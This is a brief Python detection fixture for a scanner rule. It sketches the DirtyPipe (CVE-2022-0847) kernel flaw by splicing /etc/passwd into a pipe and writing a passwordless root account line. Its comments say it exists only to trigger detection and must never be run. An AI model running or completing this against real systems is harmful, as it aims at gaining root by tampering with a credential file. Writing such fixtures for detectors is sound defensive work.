# Static detection fixture. Never execute: this sketches the DirtyPipe
# (CVE-2022-0847) primitive pair -- the nickname beside a splice-prepared
# pipe -- so the name-plus-behavior composite keeps convicting while bare
# nickname maps stay reference-level.
#
# Guards: dirtypipe-detected must fire suspicious when the DirtyPipe name or
# CVE-2022-0847 appears beside a splice(2) call.
import os

# DirtyPipe CVE-2022-0847 proof of concept sketch: splice the target file
# into a prepared pipe, then overwrite its page cache through the pipe.
READ_END, WRITE_END = os.pipe()
with open("/etc/passwd", "rb") as target:
    os.splice(target.fileno(), None, WRITE_END, None, 4096)
    os.write(WRITE_END, b"dirtypipe-root::0:0::/root:/bin/sh\n")
